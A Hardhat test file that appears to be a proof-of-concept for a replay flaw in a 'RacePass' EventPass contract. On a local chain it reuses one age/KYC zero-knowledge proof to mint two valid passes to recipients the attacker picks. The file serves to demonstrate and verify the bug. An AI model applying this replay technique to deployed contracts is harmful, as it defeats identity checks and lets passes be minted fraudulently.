const fs = require("fs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

function loadProof(prefix) {
  const proof = JSON.parse(fs.readFileSync(process.env[`${prefix}_PROOF`], "utf8"));
  const pub = JSON.parse(fs.readFileSync(process.env[`${prefix}_PUBLIC`], "utf8"));
  return {
    a: [proof.pi_a[0], proof.pi_a[1]],
    b: [
      [proof.pi_b[0][1], proof.pi_b[0][0]],
      [proof.pi_b[1][1], proof.pi_b[1][0]],
    ],
    c: [proof.pi_c[0], proof.pi_c[1]],
    pub,
  };
}

describe("RacePass unchanged-consumer real-proof replay", function () {
  it("accepts one age/KYC proof twice and mints passes to two caller-chosen recipients", async function () {
    const [deployer, attacker, secondRecipient] = await ethers.getSigners();
    const age = loadProof("AGE");
    const kyc = loadProof("KYC");

    const AgeVerifier = await ethers.getContractFactory("AgeVerifier");
    const ageVerifier = await AgeVerifier.deploy();
    await ageVerifier.waitForDeployment();
    const KYCVerifier = await ethers.getContractFactory("KYCVerifier");
    const kycVerifier = await KYCVerifier.deploy();
    await kycVerifier.waitForDeployment();

    expect(await ageVerifier.verifyProof(age.a, age.b, age.c, age.pub)).to.equal(true);
    expect(await kycVerifier.verifyProof(kyc.a, kyc.b, kyc.c, kyc.pub)).to.equal(true);

    const RevocationRegistry = await ethers.getContractFactory("RevocationRegistry");
    const revocation = await RevocationRegistry.deploy();
    await revocation.waitForDeployment();
    const now = Number((await ethers.provider.getBlock("latest")).timestamp);
    const EventPass = await ethers.getContractFactory("EventPass");
    const pass = await EventPass.deploy(
      "BindCheck local validation",
      now + 3600,
      now - 1,
      now + 86400,
      await ageVerifier.getAddress(),
      await kycVerifier.getAddress(),
      await revocation.getAddress(),
      ethers.ZeroAddress,
      0,
      true,
      100,
      0,
      [],
      ethers.ZeroAddress,
    );
    await pass.waitForDeployment();

    const firstCredential = ethers.keccak256(ethers.toUtf8Bytes("attacker-selected-credential-1"));
    const firstMint = await pass.connect(attacker).mintPass(
      age.a, age.b, age.c, age.pub,
      kyc.a, kyc.b, kyc.c, kyc.pub,
      firstCredential, "0x0000", attacker.address,
    );
    await firstMint.wait();

    const secondCredential = ethers.keccak256(ethers.toUtf8Bytes("attacker-selected-credential-2"));
    const secondMint = await pass.connect(attacker).mintPass(
      age.a, age.b, age.c, age.pub,
      kyc.a, kyc.b, kyc.c, kyc.pub,
      secondCredential, "0x0000", secondRecipient.address,
    );
    await secondMint.wait();

    expect(await pass.ownerOf(0n)).to.equal(attacker.address);
    expect(await pass.ownerOf(1n)).to.equal(secondRecipient.address);
    expect(await pass.linkedCredential(0n)).to.equal(firstCredential);
    expect(await pass.linkedCredential(1n)).to.equal(secondCredential);
    expect(await pass.isValid(0n, attacker.address)).to.deep.equal([true, "Valid"]);
    expect(await pass.isValid(1n, secondRecipient.address)).to.deep.equal([true, "Valid"]);

    console.log(JSON.stringify({
      verifier: "real committed AgeVerifier + KYCVerifier",
      sameProofUses: 2,
      owners: [await pass.ownerOf(0n), await pass.ownerOf(1n)],
      linkedCredentials: [await pass.linkedCredential(0n), await pass.linkedCredential(1n)],
      consumer: await pass.getAddress(),
    }));
  });
});
